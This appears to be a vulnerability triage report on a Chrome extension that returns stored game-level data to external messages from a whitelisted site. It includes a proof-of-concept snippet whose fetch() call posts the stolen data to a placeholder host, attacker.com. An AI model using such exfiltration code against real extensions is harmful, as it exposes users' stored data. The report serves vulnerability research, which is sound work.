# CoCo Analysis: daiiodadbcijbaahigcijbedjhnfoaic

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 20+ (all same vulnerability pattern)

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/daiiodadbcijbaahigcijbedjhnfoaic/opgen_generated_files/bg.js
Line 751: `var storage_local_get_source = {'key': 'value'};` (CoCo framework code)
Line 972: `let packs = data.packs;`
Line 975: `if (packs[p].uuid === request.uuid)`
Line 976: `let json = JSON.parse(atob(packs[p].levels));`
Lines 978-984: Processing and building response string

**Code:**

```javascript
// Background script - External message listener (lines 969-990)
runtime.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    if(request.uuid) {  // ← attacker-controlled uuid
        runtime.storage.local.get((data) => {  // ← Read ALL storage data
            let packs = data.packs;  // ← Sensitive stored data
            let levels = "";
            for (let p in packs) {
                if (packs[p].uuid === request.uuid) {  // ← Filter by attacker-provided uuid
                    let json = JSON.parse(atob(packs[p].levels));  // ← Decode stored levels
                    for (let n in json) {
                        levels += json[n].name + "\n";
                        for (let l in json[n].lines) {
                            levels += json[n].lines[l].join(',') + "\n";
                        }
                        levels += "\n";
                    }
                    levels = levels.slice(0, -1);
                }
            }
            sendResponse({levels: levels});  // ← Send stored data back to attacker
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages from whitelisted domain `https://www.ludoid.fr/*`

**Attack:**

```javascript
// Attacker webpage at https://www.ludoid.fr/attack.html
// Can query stored levels data by uuid
chrome.runtime.sendMessage(
  'extension_id_here',
  { uuid: 'target-uuid-123' },  // Try different UUIDs to enumerate stored data
  (response) => {
    if (response && response.levels) {
      console.log('Exfiltrated levels data:', response.levels);
      // Send to attacker server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(response)
      });
    }
  }
);

// Attacker can also enumerate all UUIDs by trying common patterns
// or by observing UUIDs used on the legitimate site
```

**Impact:** Information disclosure of stored game levels data. The attacker from `https://www.ludoid.fr/*` can retrieve user-created game levels stored in chrome.storage.local by providing the UUID. This allows exfiltration of potentially private or premium game content created by users. While the data is filtered by UUID (requiring the attacker to know or guess valid UUIDs), any known UUID can be used to extract the corresponding level data. This violates user privacy by exposing stored extension data to external websites.
